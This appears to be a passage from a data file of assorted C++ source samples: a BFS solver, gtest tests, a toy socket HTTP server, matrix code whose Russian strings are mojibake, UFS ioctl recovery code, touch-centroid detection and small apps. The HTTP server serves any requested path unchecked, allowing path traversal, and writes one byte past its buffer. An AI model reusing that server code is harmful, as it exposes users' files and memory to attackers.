std::vector<Position>;\n\n#endif\n\n// Beast is always a struct with a method `move`\n// with the same signature as in SampleBeast\nstruct State{\n    Position Hero_position;\n    Position Beast_position;\n\n    bool operator < (const State & other) const{\n        if(this->Hero_position != other.Hero_position){\n            return this->Hero_position < other.Hero_position;\n        }\n        return this->Beast_position < other.Beast_position;\n    }\n    bool operator == (const State & other)const{\n        return (this->Hero_position == other.Hero_position && this->Beast_position==other.Beast_position);\n    }\n};\n\ntemplate < typename Beast >\nPath find_escape_route(const Map& map, const Beast& beast) {\n\n        State start = {map.hero, map.beast}; // defining start positions\n        Path result; // result will be written there\n        if(start.Hero_position == start.Beast_position){ // if from the start beast and hero are in one position -> no reason to continue\n            return result;\n        }\n\n\n        std::queue<State> queue; // queue for state of positions of a monster and hero\n        std::set<State> visited; // which positions have already been visited\n        std::map<State, State> previous_positions; // to get the full path back\n\n        queue.emplace(start); // to start running bfs\n        visited.insert(start); // start position to be already visited\n\n       State last = start;\n\n        while(!queue.empty()){\n\n            auto CurrentState = queue.front();\n            queue.pop();\n\n            auto UP_hero = CurrentState.Hero_position.move(Direction::UP); // change hero position UP\n            if(map[UP_hero] == Tile::EMPTY && UP_hero != CurrentState.Beast_position ){  // hero can go to empty tile and not to the current beast position\n                auto UP_beast = beast.move(map, UP_hero, CurrentState.Beast_position); // find new position of beast\n                if(UP_hero != UP_beast && !vis",
    "// (c) 2024 Acid7Beast. Use with wisdom.\n#include <gtest/gtest.h>\n#include <format>\n#include <ostream>\n#include <numeric>\n\n#include <Polymorphic/Drum.h>\n#include <Polymorphic/Queue.h>\n\nnamespace\n{\n\tconstexpr size_t kCapacityCount = 6u;\n\tconstexpr std::string_view kIncendiaryType = \"Incendiary\";\n\tconstexpr std::string_view kExpansiveType = \"Expansive\";\n\n\t// Basice type of the test. Usually, a player meets in a game some kind of ammos.\n\tclass Ammo\n\t{\n\tpublic:\n\t\tvirtual ~Ammo() = default;\n\n\tpublic:\n\t\tvirtual std::string_view GetType() const = 0;\n\t};\n\n\t// This type will ignite on contact.\n\tclass Incendiary final : public Ammo\n\t{\n\tpublic:\n\t\tstd::string_view GetType() const override { return kIncendiaryType; }\n\t};\n\n\t// This type will do more damage.\n\tclass Expansive final : public Ammo\n\t{\n\tpublic:\n\t\tstd::string_view GetType() const override { return kExpansiveType; }\n\t};\n\n\tusing BeltInterface = ::Vessel::BeltInterface<Ammo>;\n\tusing Drum = ::Vessel::Drum<Ammo>;\n\tusing Queue = ::Vessel::Queue<Ammo>;\n\tusing ReferenceWrapper = ::Vessel::Drum<Ammo>::ReferenceWrapper;\n\tusing OptionalRefWrapper = ::Vessel::Drum<Ammo>::OptionalRefWrapper;\n\n\tclass BeltChecker final\n\t{\n\t\t// Life circle.\n\tpublic:\n\t\tBeltChecker(const BeltInterface& belt)\n\t\t\t: mBelt{ belt }\n\t\t{\n\t\t}\n\n\t\t// Public interface.\n\tpublic:\n\t\t// Template to iterate and check every item with custom checker.\n\t\ttemplate <typename Callable>\n\t\tvoid IterateItems(const std::vector<OptionalRefWrapper>& items, Callable&& callback) const\n\t\t{\n\t\t\tfor (size_t index = 0; index < items.size(); ++index)\n\t\t\t{\n\t\t\t\tcallback(index, items[index]);\n\t\t\t}\n\t\t}\n\n\t\t// Check non-empty slots.\n\t\tvoid CheckOccupiedSlots(const std::set<size_t>& indices) const\n\t\t{\n\t\t\tstd::vector<OptionalRefWrapper> items = mBelt.GetSlotItems();\n\n\t\t\tIterateItems(items, [&](size_t index, const OptionalRefWrapper& item) {\n\t\t\t\tEXPECT_EQ(item.has_value(), indices.contains(index));\n\t\t\t\t});\n\t\t}\n\n\t\t// Check types of inherited class.\n\t\tvoid CheckItemTypes(const std::vector<std::string>& types) const\n\t\t{\n\t\t\tstd::vector<OptionalRefWrapper> items = mBelt.GetSlotItems();\n\n\t\t\tIterateItems(items, [&](size_t index, const OptionalRefWrapper& item) {\n\t\t\t\tif (index >= types.size())\n\t\t\t\t{\n\t\t\t\t\tEXPECT_TRUE(false);\n\t\t\t\t\treturn;\n\t\t\t\t}\n\n\t\t\t\tif (item.has_value() && !types[index].empty())\n\t\t\t\t{\n\t\t\t\t\tEXPECT_EQ(item.value().get().GetType(), types[index]);\n\t\t\t\t}\n\t\t\t\t});\n\t\t}\n\n\t\t// Check common state of the belt.\n\t\tvoid CheckState(size_t itemsCount, size_t capacityCount) const\n\t\t{\n\t\t\tEXPECT_EQ(itemsCount, mBelt.GetItemCount());\n\t\t\tEXPECT_EQ(capacityCount, mBelt.GetSlotCount());\n\t\t}\n\n\t\t// Private properties.\n\tprivate:\n\t\tconst BeltInterface& mBelt;\n\t};\n\n\tclass BeltFixture : public ::testing::Test\n\t{\n\t\t// Inheritable state.\n\tprotected:\n\t\tDrum drum{ kCapacityCount };\n\t\tQueue queue{ kCapacityCount };\n\t\tBeltChecker drumChecker{ drum };\n\t\tBeltChecker queueChecker{ queue };\n\t\tIncendiary incendiaryRef{};\n\t\tExpansive expansiveRef{};\n\t};\n\n\tTEST_F(BeltFixture, ConstructorTest)\n\t{\n\t\tdrumChecker.CheckOccupiedSlots({});\n\t\tdrumChecker.CheckState(0u, kCapacityCount);\n\n\t\tqueueChecker.CheckOccupiedSlots({});\n\t\tqueueChecker.CheckState(0u, kCapacityCount);\n\t}\n\n\tTEST_F(BeltFixture, ExchangeTest)\n\t{\n\t\t// Push item with feeder by exchange it with empty slot.\n\t\t{\n\t\t\tOptionalRefWrapper expectedItem = drum.ExchangeFeederSlot(incendiaryRef);\n\t\t\tdrumChecker.CheckOccupiedSlots({ 0u });\n\t\t\tEXPECT_FALSE(expectedItem.has_value());\n\t\t}\n\t\t// Pull item from the feeder exchanging it with nothing.\n\t\t{\n\t\t\tOptionalRefWrapper expectedItem = drum.ExchangeFeederSlot();\n\t\t\tdrumChecker.CheckOccupiedSlots({});\n\t\t\tEXPECT_TRUE(expectedItem.has_value());\n\t\t}\n\t}\n\n\tTEST_F(BeltFixture, DrumTurnTest)\n\t{\n\t\t// Push some type of item to the drum to imitate a revolver.\n\t\tdrum.ExchangeFeederSlot(incendiaryRef);\n\t\tdrumChecker.CheckOccupiedSlots({ 0u });\n\t\tdrumChecker.CheckState(1u, kCapacityCount);\n\t\tdrumChecker.CheckItemTypes({\n\t\t\tkIncendiaryType.data(),\n\t\t\t{},\n\t\t\t{},\n\t\t\t{},\n\t\t\t{},\n\t\t\t{},\n\t\t\t});\n\n\t\t// The drum made a turn.\n\t\tdrum.NextBeltSlot();\n\t\tdrumChecker.CheckOccupiedSlots({ kCapacityCount - 1 });\n\t\tdrumChecker.CheckState(1u, kCapacityCount);\n\t\tdrumChecker.CheckItemTypes({\n\t\t\t{},\n\t\t\t{},\n\t\t\t{},\n\t\t\t{},\n\t\t\t{},\n\t\t\tkIncendiaryType.data(),\n\t\t\t});\n\n\t\t// Push another type of item to the drum.\n\t\tdrum.ExchangeFeederSlot(expansiveRef);\n\t\tdrumChecker.CheckOccupiedSlots({ 0u, kCapacityCount - 1 });\n\t\tdrumChecker.CheckState(2u, kCapacityCount);\n\t\tdrumChecker.CheckItemTypes({\n\t\t\tkExpansiveType.data(),\n\t\t\t{},\n\t\t\t{},\n\t\t\t{},\n\t\t\t{},\n\t\t\tkIncendiaryType.data(),\n\t\t\t});\n\n\t\t// The drum made a one more turn.\n\t\tdrum.NextBeltSlot();\n\t\tdrumChecker.CheckOccupiedSlots({ kCapacityCount - 2, kCapacityCount - 1 });\n\t\tdrumChecker.CheckState(2u, kCapacityCount);\n\t\tdrumChecker.CheckItemTypes({\n\t\t\t{},\n\t\t\t{},\n\t\t\t{},\n\t\t\t{},\n\t\t\tkIncendiaryType.data(),\n\t\t\tkExpansiveType.data(),\n\t\t\t});\n\n\t\t// Turn the drum until an item on the feeder appears.\n\t\twhile (drum.IsEmptySlot())\n\t\t{\n\t\t\tdrum.NextBeltSlot();\n\t\t}\n\t\tdrumChecker.CheckOccupiedSlots({ 0u, 1",
    "// C++ program to show the example of server application in\n// socket programming\n#include <cstring>\n#include <iostream>\n#include <netinet/in.h>\n#include <sys/socket.h>\n#include <unistd.h>\n#include <cstring>\n#include <regex>\n#include<fstream>\n#include<streambuf>\nusing namespace std;\n\nint rexparse(const char* buffer,string &reqtype,string &path){\n\t//regular expression for matching first line like - \"GET /index.html HTTP/1.1\" ---just an example \n\tstd::regex pattern(R\"((GET|POST|DELETE|PUT)\\s+/(\\S+)\\s+(HTTP/\\d\\.\\d))\");\n\n\t\n\tstd::cmatch matches; //dont use smatch for matching char* lmao\n\tif(std::regex_search(buffer,matches,pattern)){            //using regex_search is better than match which is strict\n\t\t//cout<< \"Request Type:\"<<matches[1]<<endl;\n\t\treqtype = matches[1].str();\n\t\t//cout<< \"Address: \"<<matches[2]<<endl;\n\t\tpath = matches[2].str();\n\t\t//cout<< \"HTTP version:\"<<matches[3]<<endl;\n\t\treturn 1;\n\t\t}\n\n\treturn 0;\n}\nint serveFile(const string& path,int clientSocket){\n\tstd::ifstream file(path);\n\tif(file.is_open()){\n\t\t//reading file contents and then sending\n\t\tstd::string fileContent((std::istreambuf_iterator<char>(file)),std::istreambuf_iterator<char>());\n\n\t\t//response for sending with header and content type\n\t\tstd::string response = \"HTTP/1.1 200 OK\\r\\nContent-Type: text/html\\r\\n\\r\\n\"+fileContent;\n\n\t\t//sending the damn response\n\t\tsend(clientSocket,response.c_str(),response.length(),0);\n\t}\n\telse{\n\t\t//file not found , 404\n\t\tconst char* response = \"HTTP/1.1 404 Not Found\\r\\nContent-Type: text/plain\\r\\n\\r\\nFile not Found\";\n\t\tsend(clientSocket,response,strlen(response),0);\n\t}\n}\n\nint main()\n{\n    // creating socket\n    int serverSocket = socket(AF_INET, SOCK_STREAM, 0);\n    if(serverSocket==-1){\n\tcout<<\"Socket creation Failed!\"<<endl;\n    }\n\n    // specifying the address\n    sockaddr_in serverAddress;\n    serverAddress.sin_family = AF_INET;\n    serverAddress.sin_port = htons(4561);\n    serverAddress.sin_addr.s_addr = INADDR_ANY;\n\n    // binding socket.\n    if(bind(serverSocket, (struct sockaddr*)&serverAddress,sizeof(serverAddress))<0){\n\tcerr<<\"Binding Failed!\"<<endl;\n\treturn -1;\n    }\n\n    // listening to the assigned socket\n    if(listen(serverSocket, 5)<0){\n\tcerr<<\"Listen Failed!\"<<endl;\n\tclose(serverSocket);\n\treturn -1;\n    };\n\n    char buffer[1024] = {0};\n    while(true){\n    // accepting connection request\n\tint clientSocket = accept(serverSocket, nullptr, nullptr);\n\tif(clientSocket<0){\n\t\tcerr<<\"Accept Failed!\"<<endl;\n\t\tclose(clientSocket);\n\t\treturn -1;\n\t}\n\n    // recieving data\n   \t //char buffer[1024] = { 0 };\n    \t int bytes_recvd = recv(clientSocket, buffer, sizeof(buffer), 0);\n\t if(bytes_recvd<0){\n\t\tcerr<<\"Failed to receive!\"<<endl;\n\t\tclose(clientSocket);\n\t\treturn -1;\n\t }\n\n\t //null terminate the string\n\t buffer[bytes_recvd] = '\\0';\n\t \n\t //printing the received buffer\n\t cout << buffer<< endl;\n    \t \n\t std::string req_type;\n\t std::string file;\n\n\n\t //parsing the buffer\n\t if(rexparse(buffer,req_type,file)==1){\n\t\tcout<<\"Got a request and it was parsed!Above is the info\"<<\"this is the req=\"<<req_type<<\"file requested\"<<file<<endl;\n\t }\n\t\n\t if(req_type==\"GET\"){\n\t serveFile(file,clientSocket);\n\t }\n\t if(file==\"\"){\n\t\tconst char *response = \"HTTP/1.1 200 OK\\r\\nContent-Type: text/plain\\r\\n\\r\\nOK\";\n\t\tsend(clientSocket,response,strlen(response),0);\n\t }\n\t //drafting a response to send\n\t //const char *response = \"HTTP/1.1 200 OK\\r\\n\";\n         \n\t //const char *response = \"HTTP/1.1 200 OK\\r\\nContent-Type: text/plain\\r\\n\\r\\nHello, world!\";\t \n\t \n\t //send(clientSocket, response, strlen(response) , 0);\n\t //cout<<req_type<<file<<endl;\t \n\t //if(sentBytes<0){cout<\"Sending Failed!\"<<endl;}\n\t //closing client socket after processing request\n\t \n\t close(clientSocket);\n    }\n   \n    return 0;\n}\n\n",
    "\n#include <iostream>\n#include <cmath> \n\nusing namespace std;\n\nvoid rearrangeMatrix(int matrix[][100], int n, int m, int k) {\n    int maxValue = 0;\n    int maxRow = -1, maxCol = -1;\n\n    \n    for (int i = 0; i < n; ++i) {\n        for (int j = 0; j < m; ++j) {\n            if (abs(matrix[i][j]) > maxValue) {\n                maxValue = abs(matrix[i][j]);\n                maxRow = i;\n                maxCol = j;\n            }\n        }\n    }\n\n    \n    for (int j = 0; j < m; ++j) {\n        swap(matrix[k][j], matrix[maxRow][j]);\n    }\n\n    \n    for (int i = 0; i < n; ++i) {\n        swap(matrix[i][k], matrix[i][maxCol]);\n    }\n\n    \n    cout << \"\u00c8\u00e7\u00ec\u00e5\u00ed\u00e5\u00ed\u00ed\u00e0\u00ff \u00ec\u00e0\u00f2\u00f0\u00e8\u00f6\u00e0:\" << endl;\n    for (int i = 0; i < n; ++i) {\n        for (int j = 0; j < m; ++j) {\n            cout << matrix[i][j] << \" \";\n        }\n        cout << endl;\n    }\n}\n\nint main() {\n    setlocale(LC_ALL, \"RU\");\n    int n, m, k;\n    int matrix[100][100]; \n\n    cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00ea\u00ee\u00eb\u00e8\u00f7\u00e5\u00f1\u00f2\u00e2\u00ee \u00f1\u00f2\u00f0\u00ee\u00ea \u00e8 \u00f1\u00f2\u00ee\u00eb\u00e1\u00f6\u00ee\u00e2 \u00ec\u00e0\u00f2\u00f0\u00e8\u00f6\u00fb (n m): \";\n    cin >> n >> m;\n\n    cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00fd\u00eb\u00e5\u00ec\u00e5\u00ed\u00f2\u00fb \u00ec\u00e0\u00f2\u00f0\u00e8\u00f6\u00fb:\" << endl;\n    for (int i = 0; i < n; ++i) {\n        for (int j = 0; j < m; ++j) {\n            cin >> matrix[i][j];\n        }\n    }\n\n    cout << \"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00ed\u00ee\u00ec\u00e5\u00f0 \u00f1\u00f2\u00f0\u00ee\u00ea\u00e8 \u00e8 \u00f1\u00f2\u00ee\u00eb\u00e1\u00f6\u00e0 (k): \";\n    cin >> k;\n    k--;\n\n   \n    if (k < 0 || k >= min(n, m)) {\n        cout << \"\u00cd\u00e5\u00e2\u00e5\u00f0\u00ed\u00ee\u00e5 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00e5 k.\" << endl;\n    }\n    else {\n        rearrangeMatrix(matrix, n, m, k);\n    }\n\n    return 0;\n}\n\n",
    "/*\n * Copyright (c) 2020 The Linux Foundation. All rights reserved.\n *\n * Redistribution and use in source and binary forms, with or without\n * modification, are permitted provided that the following conditions are\n * met:\n *     * Redistributions of source code must retain the above copyright\n *       notice, this list of conditions and the following disclaimer.\n *     * Redistributions in binary form must reproduce the above\n *       copyright notice, this list of conditions and the following\n *       disclaimer in the documentation and/or other materials provided\n *       with the distribution.\n *     * Neither the name of The Linux Foundation nor the names of its\n *       contributors may be used to endorse or promote products derived\n *       from this software without specific prior written permission.\n *\n * THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY EXPRESS OR IMPLIED\n * WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF\n * MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NON-INFRINGEMENT\n * ARE DISCLAIMED.  IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS\n * BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR\n * CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF\n * SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR\n * BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,\n * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE\n * OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN\n * IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\n */\n\n\n#define LOG_TAG \"recovery_ufs\"\n\n#include \"recovery-ufs-bsg.h\"\n\n#ifndef _BSG_FRAMEWORK_KERNEL_HEADERS\n#ifndef _GENERIC_KERNEL_HEADERS\n#include <scsi/ufs/ioctl.h>\n#include <scsi/ufs/ufs.h>\n#endif\n#endif\n\n//Size of the buffer that needs to be passed to the UFS ioctl\n#define UFS_ATTR_DATA_SIZE          32\n\n#ifdef _BSG_FRAMEWORK_KERNEL_HEADERS\nstatic int get_ufs_bsg_dev(void)\n{\n    DIR *dir;\n    struct dirent *ent;\n    int ret = -ENODEV;\n\n    if ((dir = opendir (\"/dev\")) != NULL) {\n        /* read all the files and directories within directory */\n        while ((ent = readdir(dir)) != NULL) {\n            if (!strcmp(ent->d_name, \"ufs-bsg\") ||\n                    !strcmp(ent->d_name, \"ufs-bsg0\")) {\n                snprintf(ufs_bsg_dev, FNAME_SZ, \"/dev/%s\", ent->d_name);\n                ret = 0;\n                break;\n            }\n        }\n        if (ret)\n            ALOGE(\"could not find the ufs-bsg dev\\n\");\n        closedir (dir);\n    } else {\n        /* could not open directory */\n        ALOGE(\"could not open /dev (error no: %d)\\n\", errno);\n        ret = -EINVAL;\n    }\n\n    return ret;\n}\n\nint ufs_bsg_dev_open(void)\n{\n    int ret;\n    if (!fd_ufs_bsg) {\n        fd_ufs_bsg = open(ufs_bsg_dev, O_RDWR);\n        ret = errno;\n        if (fd_ufs_bsg < 0) {\n            ALOGE(\"Unable to open %s (error no: %d)\",\n                    ufs_bsg_dev, errno);\n            fd_ufs_bsg = 0;\n            return ret;\n        }\n    }\n    return 0;\n}\n\nvoid ufs_bsg_dev_close(void)\n{\n    if (fd_ufs_bsg) {\n        close(fd_ufs_bsg);\n        fd_ufs_bsg = 0;\n    }\n}\n\nstatic int ufs_bsg_ioctl(int fd, struct ufs_bsg_request *req,\n        struct ufs_bsg_reply *rsp, __u8 *buf, __u32 buf_len,\n        enum bsg_ioctl_dir dir)\n{\n    int ret;\n    struct sg_io_v4 sg_io = {0};\n\n    sg_io.guard = 'Q';\n    sg_io.protocol = BSG_PROTOCOL_SCSI;\n    sg_io.subprotocol = BSG_SUB_PROTOCOL_SCSI_TRANSPORT;\n    sg_io.request_len = sizeof(*req);\n    sg_io.request = (__u64)req;\n    sg_io.response = (__u64)rsp;\n    sg_io.max_response_len = sizeof(*rsp);\n    if (dir == BSG_IOCTL_DIR_FROM_DEV) {\n        sg_io.din_xfer_len = buf_len;\n        sg_io.din_xferp = (__u64)(buf);\n    } else {\n        sg_io.dout_xfer_len = buf_len;\n        sg_io.dout_xferp = (__u64)(buf);\n    }\n\n    ret = ioctl(fd, SG_IO, &sg_io);\n    if (ret)\n        ALOGE(\"%s: Error from sg_io ioctl (return value: %d, error no: %d, reply result from LLD: %d\\n)\",\n                __func__, ret, errno, rsp->result);\n\n    if (sg_io.info || rsp->result) {\n        ALOGE(\"%s: Error from sg_io info (check sg info: device_status: 0x%x, transport_status: 0x%x, driver_status: 0x%x, reply result from LLD: %d\\n)\",\n                __func__, sg_io.device_status, sg_io.transport_status,\n                sg_io.driver_status, rsp->result);\n        ret = -EAGAIN;\n    }\n\n    return ret;\n}\n\nstatic void compose_ufs_bsg_query_req(struct ufs_bsg_request *req, __u8 func,\n        __u8 opcode, __u8 idn, __u8 index, __u8 sel,\n        __u16 length)\n{\n    struct utp_upiu_header *hdr = &req->upiu_req.header;\n    struct utp_upiu_query *qr = &req->upiu_req.qr;\n\n    req->msgcode = UTP_UPIU_QUERY_REQ;\n    hdr->dword_0 = DWORD(UTP_UPIU_QUERY_REQ, 0, 0, 0);\n    hdr->dword_1 = DWORD(0, func, 0, 0);\n    hdr->dword_2 = DWORD(0, 0, length >> 8, (__u8)length);\n    qr->opcode = opcode;\n    qr->idn = idn;\n    qr->index = index;\n    qr->selector = sel;\n    qr->length = htobe16(length);\n}",
    "#include \"CentroidDetection.h\"\n\n// a small helper class, whose main purpose is to wrap the #include\n// and make all the variables related to it private and multi-instance safe\nclass CentroidDetection::CalculateCentroids\n{\npublic:\n\ttypedef CentroidDetection::WORD WORD;\n\ttypedef uint8_t BYTE;\n\ttypedef uint8_t BOOL;\n\tWORD* CSD_waSnsDiff;\n\tWORD wMinimumCentroidSize = 0;\n\tBYTE SLIDER_BITS = 7;\n\tWORD wAdjacentCentroidNoiseThreshold = 400; // Trough between peaks needed to identify two centroids\n\t// calculateCentroids is defined here:\n#include \"calculateCentroids.h\"\n\tvoid processCentroids(WORD *wVCentroid, WORD *wVCentroidSize, BYTE MAX_NUM_CENTROIDS, BYTE FIRST_SENSOR_V, BYTE LAST_SENSOR_V, BYTE numSensors) {\n\t\tlong temp;\n\t\tsigned char firstActiveSensor;\n\t\tsigned char lastActiveSensor;\n\t\tBOOL bActivityDetected;\n\t\tBYTE counter;\n\t\tWORD posEndOfLoop = (LAST_SENSOR_V - FIRST_SENSOR_V) << SLIDER_BITS;\n#include \"processCentroids.h\"\n\t}\n};\n\nCentroidDetection::CentroidDetection(unsigned int numReadings, unsigned int maxNumCentroids, float sizeScale)\n{\n\tsetup(numReadings, maxNumCentroids, sizeScale);\n}\n\nCentroidDetection::CentroidDetection(const std::vector<unsigned int>& order, unsigned int maxNumCentroids, float sizeScale)\n{\n\tsetup(order, maxNumCentroids, sizeScale);\n}\n\nint CentroidDetection::setup(unsigned int numReadings, unsigned int maxNumCentroids, float sizeScale)\n{\n\tstd::vector<unsigned int> order;\n\tfor(unsigned int n = 0; n < numReadings; ++n)\n\t\torder.push_back(n);\n\treturn setup(order, maxNumCentroids, sizeScale);\n}\n\nint CentroidDetection::setup(const std::vector<unsigned int>& order, unsigned int maxNumCentroids, float sizeScale)\n{\n\tthis->order = order;\n\tsetWrapAround(0);\n\tthis->maxNumCentroids = maxNumCentroids;\n\tcentroidBuffer.resize(maxNumCentroids);\n\tsizeBuffer.resize(maxNumCentroids);\n\tcentroids.resize(maxNumCentroids);\n\tsizes.resize(maxNumCentroids);\n\tdata.resize(order.size());\n\tsetSizeScale(sizeScale);\n\tsetNoiseThreshold(0);\n\tcc = std::shared_ptr<CalculateCentroids>(new CalculateCentroids());\n\tsetMultiplierBits(cc->SLIDER_BITS);\n\tnum_touches = 0;\n\treturn 0;\n}\n\nvoid CentroidDetection::setWrapAround(unsigned int n)\n{\n\tnum_sensors = order.size() + n;\n}\n\nvoid CentroidDetection::setMultiplierBits(unsigned int n)\n{\n\tcc->SLIDER_BITS = n;\n\tlocationScale = (order.size() - 1) * (1 << cc->SLIDER_BITS);\n}\n\nvoid CentroidDetection::process(const DATA_T* rawData)\n{\n\tfor(unsigned int n = 0; n < order.size(); ++n)\n\t{\n\t\tfloat val = rawData[order[n]] * (1 << 12);\n\t\tval -= noiseThreshold;\n\t\tif(val < 0)\n\t\t\tval = 0;\n\t\tdata[n] = val;\n\t}\n\tcc->CSD_waSnsDiff = data.data();\n\tcc->processCentroids(centroidBuffer.data(), sizeBuffer.data(), maxNumCentroids, 0, order.size(), num_sensors);\n\n\tunsigned int locations = 0;\n\t// Look for 1st instance of 0xFFFF (no touch) in the buffer\n\tunsigned int i;\n\tfor(i = 0; i < centroidBuffer.size(); ++i)\n\t{\n\t\tif(0xffff == centroidBuffer[i])\n\t\t\tbreak;// at the first non-touch, break\n\t\tcentroids[i] = centroidBuffer[i] / locationScale;\n\t\tsizes[i] = sizeBuffer[i] / sizeScale;\n\t}\n\tnum_touches = i;\n}\n\nvoid CentroidDetection::setSizeScale(float sizeScale)\n{\n\tthis->sizeScale = sizeScale;\n}\n\nvoid CentroidDetection::setMinimumTouchSize(DATA_T minSize)\n{\n\tcc->wMinimumCentroidSize = minSize;\n}\n\nvoid CentroidDetection::setNoiseThreshold(DATA_T threshold)\n{\n\tnoiseThreshold = threshold;\n}\n\nunsigned int CentroidDetection::getNumTouches() const\n{\n\treturn num_touches;\n}\n\nCentroidDetection::DATA_T CentroidDetection::touchLocation(unsigned int touch_num) const\n{\n\tif(touch_num < maxNumCentroids)\n\t\treturn centroids[touch_num];\n\telse\n\t\treturn 0;\n}\n\nCentroidDetection::DATA_T CentroidDetection::touchSize(unsigned int touch_num) const\n{\n\tif(touch_num < num_touches)\n\t\treturn sizes[touch_num];\n\telse\n\t\treturn 0;\n}\n\n// code below from Trill.cpp\n\n#define compoundTouch(LOCATION, SIZE, TOUCHES) {\\\n\tfloat avg = 0;\\\n\tfloat totalSize = 0;\\\n\tunsigned int numTouches = TOUCHES;\\\n\tfor(unsigned int i = 0; i < numTouches; i++) {\\\n\t\tavg += LOCATION(i) * SIZE(i);\\\n\t\ttotalSize += SIZE(i);\\\n\t}\\\n\tif(numTouches)\\\n\t\tavg = avg / totalSize;\\\n\treturn avg;\\\n\t}\n\nCentroidDetection::DATA_T CentroidDetection::compoundTouchLocation() const\n{\n\tcompoundTouch(touchLocation, touchSize, getNumTouches());\n}\n\nCentroidDetection::DATA_T CentroidDetection::compoundTouchSize() const\n{\n\tfloat size = 0;\n\tfor(unsigned int i = 0; i < getNumTouches(); i++)\n\t\tsize += touchSize(i);\n\treturn size;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"sssss\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\r\n#include <string>\r\n#include <vector>\r\n#include <fstream>\r\nusing namespace std;\r\n\r\nstruct Task{\r\n  string description;\r\n  string status;    //\"To_do , In_progress , Done\"\r\n};\r\n\r\n\r\nvoid AddTask(vector<Task>& tasks) {\r\n  string description;\r\n     cout << \"Please enter the task description. \";\r\n  cin.ignore();\r\n  getline(cin, description);\r\n\r\n     Task newTask;\r\n     newTask.description = description;\r\n     newTask.status = \"To_do\";\r\n     tasks.push_back(newTask);\r\n    cout << \"Task added succesfully! \" << endl;\r\n}\r\n\r\n\r\nvoid listTasks(const vector<Task>& tasks){\r\n  if(tasks.empty()) {\r\n     cout << \"No tasks available. \" << endl;\r\n     return;\r\n  }\r\n  for (size_t i = 0; i < tasks.size(); ++i) {\r\n    cout << i + 1 << \". \" << tasks[i].description << \" [\" << tasks[i].status << \"]\" << endl;\r\n  }\r\n}\r\n\r\nvoid markTaskDone(vector<Task>& tasks, int index){\r\n  if(index <= 0 || index > tasks.size()){\r\n    cout << \"Invalid task number. \" << endl;\r\n    return;\r\n  }\r\n  tasks[index - 1].status = \"Done. \";\r\n     cout << \"Task marked as Done! \" << endl;\r\n}\r\n\r\nvoid loadTasks(vector<Task>& tasks, const string& filename){\r\n  ifstream infile(filename);\r\n  if (!infile){\r\n    cout << \"No previous task file found. Starting new. \" << endl;\r\n    return;\r\n  }\r\n\r\n  string description, status;\r\n  while (getline(infile, description)){\r\n    getline(infile, status);\r\n    Task task;\r\n    task.description = description;\r\n    task.status = status;\r\n    tasks.push_back(task);\r\n  }\r\n  infile.close();\r\n}\r\n\r\nvoid saveTasks(const vector<Task>& tasks, const string& filename){\r\n  ofstream outfile(filename);\r\n  for (const auto& task : tasks){\r\n    outfile << task.description << endl;\r\n    outfile << task.status << endl;\r\n  }\r\n  outfile.close();\r\n}\r\n\r\n\r\nint main(){\r\n  vector<Task> tasks;\r\n  const string filename = \"tasks.txt\";\r\n\r\n  loadTasks(tasks, filename);\r\n  string command;\r\n  while (true){\r\n    cout << \"Enter prompt (add/list/done/exit): \";\r\n    cin >> command;\r\n\r\n     if (command == \"add\"){\r\n      AddTask(tasks);\r\n     } else if (command == \"list\"){\r\n      listTasks(tasks);\r\n     } else if (command == \"done\"){\r\n      int index;\r\n       cout << \"Enter task number: \";\r\n       cin >> index;\r\n      markTaskDone(tasks, index);\r\n     } else if (command == \"exit\"){\r\n      saveTasks(tasks, filename);\r\n      cout << \"Tasks saved, exiting. \" << endl;\r\n      break;\r\n     } else {\r\n       cout << \"Unknown prompt. Try again. \" << endl;\r\n     }\r\n  }\r\n  return 0;\r\n}",
